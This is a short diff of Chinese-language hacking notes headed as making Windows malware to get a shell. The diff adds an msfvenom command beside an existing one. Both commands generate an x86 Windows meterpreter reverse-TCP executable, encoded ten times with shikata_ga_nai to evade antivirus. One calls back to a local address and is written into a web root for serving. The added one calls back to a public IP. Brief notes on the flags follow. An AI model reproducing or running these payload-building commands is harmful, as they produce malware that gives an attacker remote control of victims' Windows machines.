@@ -2,6 +2,8 @@
 	@制作Windows恶意软件获取shell@
 sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.100.143 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/xiao1.exe
 
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=47.95.141.60 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/xiao/win.exe
+
 --platform 指定平台
 -p 指定payload类型
 -a 指定架构如x86 x64
